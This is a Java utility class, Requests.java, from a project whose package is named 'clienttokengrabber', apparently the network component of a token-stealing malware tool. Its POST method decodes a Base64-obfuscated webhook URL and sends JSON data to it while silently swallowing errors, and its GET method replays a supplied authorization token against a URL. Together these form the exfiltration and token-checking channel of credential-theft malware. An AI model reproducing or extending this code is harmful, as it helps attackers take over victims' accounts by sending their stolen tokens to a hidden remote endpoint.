package main.java.clienttokengrabber.utils;

import java.util.Base64;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.nio.charset.StandardCharsets;
import java.net.URL;
import javax.net.ssl.HttpsURLConnection;


public class Requests {
    public static void post(String jsonPayload, String url) {
        try {
            URL webhookURL = new URL(decode(url));
            HttpsURLConnection webhookConnection = (HttpsURLConnection) webhookURL.openConnection();
            webhookConnection.setRequestMethod("POST");
            webhookConnection.setRequestProperty("Content-Type", "application/json");
            webhookConnection.setDoOutput(true);

            OutputStream os = webhookConnection.getOutputStream();
            byte[] input = jsonPayload.getBytes(StandardCharsets.UTF_8);
            os.write(input, 0, input.length);

            System.out.println("POST Response Code: " + webhookConnection.getResponseCode());

            webhookConnection.disconnect();
        } catch (Exception ignored) {
        }
    }

    public static String get(String token, String urlString) {
        try {
            URL url = new URL(urlString);
            HttpsURLConnection connection = (HttpsURLConnection) url.openConnection();
            connection.setRequestProperty("Authorization", token);

            int responseCode = connection.getResponseCode();
            System.out.println("GET Response Code: " + responseCode);
            if (responseCode == HttpsURLConnection.HTTP_OK) {
                BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                String line = reader.readLine();

                reader.close();
                return line;
            }
        } catch (Exception ignored) {
        }
        return null;
    }

    private static String decode(String url) {
        return new String(Base64.getDecoder().decode(url));
    }
}
